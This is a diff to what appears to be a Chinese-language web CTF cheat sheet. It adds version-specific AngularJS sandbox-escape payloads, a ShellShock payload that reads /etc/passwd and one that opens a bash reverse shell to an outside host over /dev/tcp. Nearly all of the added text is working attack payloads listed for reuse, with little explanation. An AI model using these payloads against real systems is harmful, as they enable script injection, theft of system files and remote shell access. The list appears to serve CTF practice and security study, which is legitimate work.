@@ -1088,6 +1088,22 @@ Server-Side Template Injection
             - load config
         - `{{ config['RUNCMD']('cat flag',shell=True) }}`
 
+- AngularJS
+    - v1.6後移除Sandbox
+    - `{{ 7*7 }}` => 49
+    - `{{ this }}`
+    - `{{ this.toString() }}`
+    - `{{ constructor.toString() }}`
+    - `{{ constructor.constructor('alert(1)')() }}` 2.1 v1.0.1-v1.1.5
+    - `{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }}` 2.1 v1.0.1-v1.1.5
+    - `{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)  }}` 2.3 v1.2.19-v1.2.23
+    - `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}` v1.2.24-v1.2.29
+    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` v1.3.20
+    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` v1.4.0-v1.4.9
+    - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
+    - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6
+
+    
 
 - Python
     - `%`
@@ -1381,6 +1397,8 @@ xxe.dtd:
 - ShellShock
     
     - `() { :; }; echo vulnerable`
+    - `() { :a; }; /bin/cat /etc/passwd`
+    - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
 
 - X-forwarded-for偽造來源IP
 
@@ -1482,6 +1500,9 @@ xxe.dtd:
     - git / svn / hg / cvs ...
 
 - http://www.factordb.com/
+
+- unicode converter
+    - https://www.branah.com/unicode-converter
 
 - PHP混淆 / 加密
     - http://enphp.djunny.com/
